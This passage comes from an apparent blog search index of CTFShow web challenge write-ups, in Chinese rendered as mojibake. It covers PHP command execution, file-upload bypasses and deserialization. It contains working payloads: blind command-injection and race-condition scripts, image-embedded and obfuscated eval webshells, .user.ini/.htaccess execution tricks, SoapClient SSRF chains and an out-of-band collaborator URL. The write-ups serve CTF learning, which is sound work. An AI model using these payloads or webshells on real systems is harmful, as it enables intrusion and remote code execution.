http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-09 15.18.07.png)\n\n**134**\n\nphpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\nåŒä¹‹å‰æˆ–è€…ç›´æ¥mvæ”¹å\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nbanäº†ä¸€å †å‘½ä»¤ï¼Œéœ€è¦å›æ˜¾ï¼Œä½¿ç”¨Linux teeå‘½ä»¤\n\nTeeæ˜¯Linuxå‘½ä»¤ï¼Œç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚\n\n```\nå‘½ä»¤|tee è¾“å‡ºæ–‡ä»¶\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\næŸ¥çœ‹/1æ–‡ä»¶å³å¯\n```\n\n**137**\n\ncall_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•æ—¶ï¼Œä½¿ç”¨::å¦‚class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\nè°ƒç”¨è¿˜èƒ½ä¼ æ•°ç»„\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\nè‡ªåŠ¨è·³è½¬æˆ‘è°¢è°¢ä½ å•Š\n\næˆ‘æ˜¯çœŸå¦¹æƒ³åˆ°è¿™ç©æ„è¿˜èƒ½ç›²æ³¨\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#è·å–å°å†™å­—æ¯ä¸æ•°å­—\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintvalæŠŠå­—ç¬¦ä¸²è½¬æˆ0ï¼Œ0=='å­—ç¬¦ä¸²'ç»“æœä¸ºçœŸ\n\næ‰¾ä¿©å‡½æ•°è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²å°±è¡Œ\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[ç»•è¿‡æ— å­—æ¯æ•°å­—æ–¹æ³•](https://blog.csdn.net/miuzzx/article/details/109143413)\n\nä½¿ç”¨å–åæ³•\n\n```\npayloadï¼š\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\nå„ç§è¿›åˆ¶å–é›¶å°±è¡Œ\n\n**143**\n\nè¿‡æ»¤äº†å–åå­—ç¬¦ï¼Œ\n"},{"title":"CTFShowæ–‡ä»¶ä¸Šä¼ ","url":"/posts/2824.html","content":"\n# æ–‡ä»¶ä¸Šä¼ \n\n\n\n\n\n\n\n\n\n\n\n\n\n**151**\n\nå‰ç«¯æ ¡éªŒï¼Œç›´æ¥ç»•è¿‡\n\n**152**\n\nContent/Typeæ ¡éªŒï¼Œç›´æ¥ç»•è¿‡\n\n**153**\n\næ–‡ä»¶åç¼€åæ ¡éªŒï¼Œå°è¯•ä½¿ç”¨php5,phtmlç­‰æ–‡ä»¶å¤±è´¥ï¼Œåº·åº·wpå­¦ä¹ æ–°çŸ¥è¯†ï¼ŒæŸ¥çœ‹å“åº” å¤´å‘ç°ä¸­é—´ä»¶æ˜¯nginx\n\n```\nnginxä¸­å’Œapacheçš„.htacessæœ‰ç›¸åŒä½œç”¨çš„æ–‡ä»¶æ˜¯.user.iniï¼Œè¿›ä¸€æ­¥æ‹“å±•ï¼Œphpä¸­çš„é»˜è®¤é…ç½®æ–‡ä»¶å®ä¸ºphp.iniï¼Œè€Œphp.iniæœ‰å››ç§é…ç½®æ¨¡å¼\n\nPHP_INI_USER\t\t\tå¯ä»¥åœ¨user.iniä¸­è®¾å®š\nPHP_INI_PERDIR\t\tå¯ä»¥åœ¨php.ini,.htacess,httpd.confä¸­è®¾å®š\nPHP_INI_SYSTEM\t\tå¯ä»¥åœ¨php.ini,httpd.confä¸­è®¾å®š\nPHP_INI_ALL\t\t\t\téšæ„è®¾å®š\n\nå¹¶ä¸”é™¤äº†php.iniæ–‡ä»¶ä¹‹å¤–ï¼Œphpè¿˜ä¼šä»å½“å‰ç›®å½•åˆ°webæ ¹ç›®å½•ä¸‹é€çº§æœç´¢iniæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ä¸–çºªæ“ä½œä¸­é™¤äº†PHP_INI_SYSTEMä¸­çš„å†…å®¹éƒ½å¯ä»¥é€šè¿‡.user.iniè¿›è¡Œè®¾å®š\n\né‚£ä¹ˆuser.iniä¸­å®é™…æœ‰ç”¨çš„é…ç½®é¡¹æœ‰ä¸¤ä¸ªï¼š\nauto_append_file \t//åœ¨php4.2.3åŠä»¥å‰æ˜¯PHP_INI_ALLé‡Œé¢çš„ï¼Œåé¢å˜æˆäº†PHP_INI_PERDID\nauto_prepend_file\nè¿™ä¸¤é¡¹çš„åŠŸèƒ½æ˜¯åˆ¶å®šä¸€ä¸ªæ–‡ä»¶åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶ä¹‹å/ä¹‹å‰ï¼Œç±»ä¼¼å¸®åŠ©åŸå§‹æ–‡ä»¶æ·»åŠ ä¸€ä¸ªrequire(æŸæ–‡ä»¶)\n```\n\næ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯å°†æœ¨é©¬ä¸Šä¼ åå†ä¸Šä¼ .user.iniè®¾ç½®åŒ…å«æœ¨é©¬å³å¯\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†phpï¼Œå¤§å°å†™ç»•è¿‡\n\n**155**\n\nä¸¥æ ¼è¿‡æ»¤phpï¼Œæ‰€ä»¥å¤§å°å†™è¿‡ä¸å»äº†ï¼ŒçŸ­æ ‡ç­¾ç»•è¿‡\n\n```PHP\nå½“phpå‚æ•°:short_open_tag = Onæ—¶ï¼Œphpå¯ä»¥è§£æçŸ­æ ‡ç­¾å†…å®¹\nphpä¸­å¸¸è§çš„å››ç§æ ‡ç­¾çš„å†™æ³•ï¼š\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//è¿™ç§å†™æ³•åœ¨phpé…ç½®ä¸­é»˜è®¤å…³é—­äº†çš„ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å‡ºä¸€è¡Œ3.å¦‚æœè¦æ­£å¸¸è¾“å‡ºï¼Œéœ€è¦é…ç½®php.iniæ–‡ä»¶ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°asp_tags=off ,å°†offæ”¹ä¸ºonã€‚æ”¹åŠ¨é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯apacheã€‚ \n<script language=\"php\"> echo \"CTF\"; </script>\n\nè¿˜æœ‰ä¸€ç§ç¥å¥‡å†™æ³•ä»¥åä¼šç”¨åˆ°\n<?=(è¡¨è¾¾å¼)?>  ç­‰ä»·äº <?php echo (è¡¨è¾¾å¼)?> //æ— é™åˆ¶  \n```\n\n**156**\n\nè¿‡æ»¤äº†`[  ]`ï¼Œå¯ç”¨`{  }`ä»£æ›¿\n\n**157**\n\nè¿‡æ»¤äº†åˆ†å·å’ŒèŠ±æ‹¬å·ï¼Œç”¨ä¸Šé¢çš„ç¥å¥‡å†™æ³•ç›´æ¥æ‰§è¡Œ`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\nåŒä¸Š\n\n**159**\n\nsystemè²Œä¼¼æ²¡äº†ï¼Œç”¨`<?=nl ``../fl*``?>`\n\n**160**\n\nåå¼•å·éƒ½æ²¡äº†ï¼Œåªèƒ½å°è¯•åŒ…å«è®¿é—®æ—¥å¿—äº†\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//ç©ºæ ¼éƒ½æ²¡ç»™ç•™å°±ç¦»è°±\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\nå¢åŠ äº†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œå…¶ä½™åŒä¸Š\n\n**162**\n\n.å’Œflagè¢«è¿‡æ»¤ï¼Œsessionæ–‡ä»¶çš„ç«äº‰åŒ…å«ï¼Œéš”å£æ–‡ä»¶åŒ…å«æœ‰åŸå› \n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"é“¾æ¥\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\nè„šæœ¬\n\n```python\nimport requests\nimport threading\n\nsession = requests.session()\nsess = 'j1an'\nurl1 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/\"\nurl2 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload\"\ndata1 = {\n    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"tac ../f*\");?>'\n}\nfile = {\n    'file': 'j1an'\n}\ncookies = {\n    'PHPSESSID': sess\n}\n\n\ndef write():\n    while True:\n        r = session.post(url1, data=data1, files=file, cookies=cookies)\n\n\ndef read():\n    while True:\n        r = session.get(url2)\n        print(r.text)\n        if 'flag' in r.text:\n            print(r.text)\n\n\nthreads = [threading.Thread(target=write),\n           threading.Thread(target=read)]\nfor t in threads:\n    t.start()\n```\n\n\n\n\n\n**163**\n\nåŒä¸Š\n\n**164**\n\npngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“\n\n```\nåœ¨phpä¸­åŒ…å«éœ€è¦æ¸²æŸ“çš„ä»£ç æ—¶\n```\n\nç›´æ¥ç”¨å¤§ä½¬è„šæœ¬ç”Ÿæˆä¸€å¼ å›¾ç‰‡å’¯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„\n/*\næœ¨é©¬å†…å®¹\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\nç”¨æ³•  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\næç¤ºä¸­ä¸ºhttpdï¼Œè‚¯å®šä¸apacheæœ‰å…³ï¼Œå°è¯•è§£ææ¼æ´ï¼Œä¸Šä¼ shell.php.xxxå‘ç°æ‰§è¡Œå¤±è´¥ï¼Œå°è¯•ä¸Šä¼ .htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\næˆ–è€…\nAddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp\n```\n\nOK\n\n**168**\n\næ„é€ å…æ€æœ¨é©¬\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShowååºåˆ—åŒ–","url":"/posts/17329.html","content":"\n# ååºåˆ—åŒ–\n\nåºåˆ—åŒ–çš„æ¦‚å¿µï¼šæŠŠä¸€ä¸ªå¯¹è±¡è½¬ä¸ºå­—ç¬¦ä¸²\n\nåºåˆ—åŒ–çš„å¥½å¤„ï¼š\n\n1ã€æœ‰åˆ©äºæ•°æ®å­˜å‚¨\n\n2ã€æ–¹ä¾¿æ•°æ®ä¼ é€’\n\nåºåˆ—åŒ–åå­—ç¬¦ä¸²çš„æ ¼å¼\n\n```\nPublicå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼šæˆå‘˜å\nPrivateå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00ç±»å%00æˆå‘˜å\nProtectå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00*%00æˆå‘˜å\n```\n\nO:å¯¹è±¡ç±»åé•¿åº¦:\"å¯¹è±¡ç±»å\":å¯¹è±¡å±æ€§ä¸ªæ•°{å±æ€§åç±»å‹:å±æ€§åé•¿åº¦:\"å±æ€§åå­—\";å±æ€§ç±»å‹:å±æ€§é•¿åº¦:\"å±æ€§å†…å®¹\"}\n\n```php\nPHPåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹æ³•ï¼š\n1ã€__construct å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è°ƒç”¨\n2ã€__destruct å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨\n3ã€__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ä½¿ç”¨\n4ã€__sleep åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n5ã€__wakeup åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè°ƒç”¨\n__construct\n// è§¦å‘æ¡ä»¶ï¼Œæ„é€ å‡½æ•°ï¼Œå½“æ„é€ ä¸€ä¸ªå¯¹è±¡æ—¶è°ƒç”¨ã€‚\n// å¯¹è±¡åˆ›å»ºæ—¶é”€æ¯\n__destruct\n// è§¦å‘æ¡ä»¶ï¼Œææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚\n// åºåˆ—åŒ–æ—¶ä¼šé”€æ¯ä¸€æ¬¡ï¼Œå¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œï¼Œåºåˆ—åŒ–è¾“å‡ºå‰è¿è¡Œï¼Œä½†ä¸å½±å“åºåˆ—åŒ–å†…å®¹\n__unserialize\n// è§¦å‘æ¡ä»¶ï¼Œ7.4ç‰ˆæœ¬ä»¥ä¸Šï¼Œååºåˆ—åŒ–æ—¶å‡ºå‘ï¼Œä¸”å¯ä»¥ç»•è¿‡__wakeup\n__sleep\n// åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n__wakeup\n// åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨\n__invoke\n// å½“å¯¹è±¡è¢«è°ƒç”¨æ—¶æ‰§è¡Œ\n// å‡½æ•°å½¢å¼è°ƒç”¨å¯¹è±¡æ—¶ï¼Œè§¦å‘çš„æ–¹æ³•\n```\n\n\n\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\næŒ‰ç…§é¢˜ä¸­å…¨ç­‰äºç›´æ¥æ„é€ å³å¯\n\n**255-257**\n\næ„é€ å°±è¡Œ\n\n**258**\n\nè¿‡æ»¤äº†`O:æ•°å­—`çš„å½¢å¼ï¼Œåœ¨å†’å·ååŠ +å³å¯ï¼ŒURLdecodeä¼šè‡ªåŠ¨è§£ææˆè¿æ¥çš„\n\n**259**\n\nä»€ä¹ˆç©æ„è·³è¿‡äº†\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\nç°æºœæºœçš„å›æ¥çœ‹WP\n\n```\nå¦‚æœè°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å®šä¹‰çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ç±»æœ¬èº«çš„callæ–¹æ³•ã€‚ç”±äºç»™äº†ä¸ªssrfçš„ä»£ç ï¼Œé‚£ä¹ˆæ²³é‡Œæ¨æ–­è¿™æ˜¯ä¸€ä¸ªssrfçš„åŸç”Ÿç±»ã€‚\n```\n\n\n\n```PHP\n//PHPä¸­åŸç”Ÿç±»\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//å¯ä»¥å¾—çŸ¥æ„é€ SoapClientçš„ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå­—ç¬¦ä¸²$wsdlå’Œæ•°ç»„$options\n```\n\n```php\nåœ¨æ„é€ SoapClientç±»æ—¶ï¼Œä¼ å…¥æ•°ç»„å‚æ•°ä¸ºï¼š\narray('uri'=>'http://é“¾æ¥','location'=>'http://é“¾æ¥/æ–‡ä»¶','user_agent'=>'UAå¤´')\nè¯¥ç±»çš„__callæ–¹æ³•å¯æ„é€ è¯·æ±‚ä½¿å…¶å¯¹æŒ‡å®šURLå‘èµ·POSTè¯·æ±‚\næ‰€ä»¥æ„é€ è¯¥ç±»ä»£ç å¦‚ä¸‹\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*ç›¸å½“äºæ„é€ å‡ºä»¥ä¸‹è¯·æ±‚\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //ç”±äºContent-Lengthå·²ç»ç¡®å®šï¼Œæ‰€ä»¥åé¢è¯¥ç±»è‡ªè¡Œæ„é€ çš„è¯·æ±‚å¤´å¤±æ•ˆ\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\nå°±è¾“å…¥é‚£ä¸²å­—ç¬¦å°±è¡Œ\n\n**261**\n\nçŸ¥è¯†ç‚¹ï¼šåœ¨7.4ä»¥ä¸Šç‰ˆæœ¬ååºåˆ—åŒ–ä¼šç»•è¿‡__wakeup()å‡½æ•°\n\n$this->code==0x36dæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œ0x36dåˆæœ‰æ²¡æœ‰æ‰“å¼•å·ï¼Œæ‰€ä»¥ä»£è¡¨æ•°å­—877ï¼Œæ„é€ æ—¶ä½¿ç”¨877å¼€å¤´çš„æ–‡ä»¶å³å¯ï¼Œæœ€ç»ˆæ„é€ å†…å®¹å¦‚ä¸‹\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //è¿™é‡Œè®°å¾—è½¬è¯‘ï¼Œä¸ç„¶ä¼šè®©ä½ ä¼ å…¥kkkå‚æ•°çš„\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//æ— è¯­Windows DefenceæŠŠæˆ‘æ–‡ä»¶åˆ äº†ğŸ˜…\n```\n\n**262**\n\nç®€å•è½»æ¾è§£æ³•ï¼š\n\nåœ¨message.phpä¸­ç›´æ¥æ„é€ token=adminçš„ç±»\n\nå›°éš¾å­¦ä¹ è§£æ³•ï¼š\n\n**263**\n\nèœç‹—ç›´æ¥wp\n\né¦–å…ˆçœ‹\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//æ˜æ˜¾limtiå†™é”™äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä»£ç æ°¸è¿œæ‰§è¡Œçš„æ˜¯$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sessionä¸­çš„å†…å®¹\n```\n\nçŸ¥è¯†ç‚¹ï¼šsessionåœ¨å­˜å‚¨æ—¶æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯phpï¼Œä¸€ç§æ˜¯php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//phpå­˜å‚¨ï¼šuser|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serializeå­˜å‚¨ï¼ša:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\nå‘ç°è¯¡å¼‚çš„ç‚¹äº†å—ï¼Œåœ¨phpå­˜å‚¨ä¸­ï¼Œï½œæ˜¯ç”¨æ¥åˆ†ç¦»å˜é‡åå’Œåºåˆ—åŒ–åçš„å†…å®¹çš„ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬æ„é€ å‡ºåºåˆ—åŒ–å¥½çš„å†…å®¹å¹¶ä¸”åœ¨å‰é¢åŠ ï½œå°±å¯ä»¥è®©ç¨‹åºè¿›è¡Œè‡ªåŠ¨ååºåˆ—åŒ–\n\nç»§ç»­æŸ¥çœ‹inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"ä½¿ç”¨\".$this->password.\"ç™»é™†\".($this->status?\"æˆåŠŸ\":\"å¤±è´¥\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\nå…¶ä¸­åŒ…å«`file_put_contents`å‡½æ•°å¯è¿›è¡Œä¸€å¥è¯æœ¨é©¬çš„å†™å…¥\n\næœ€ç»ˆæ„é€ å¦‚ä¸‹\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\né¦–å…ˆä¿®æ”¹cookieè®¿é—®ä¸»é¡µï¼Œç„¶åè®¿é—®/check.phpä½¿å¾—æœ¨é©¬æ–‡ä»¶è¢«å†™å…¥ï¼Œæœ€åè®¿é—®/log-1.phpå³å¯\n\n264\n\n**265**\n\nåœ°å€ä¼ 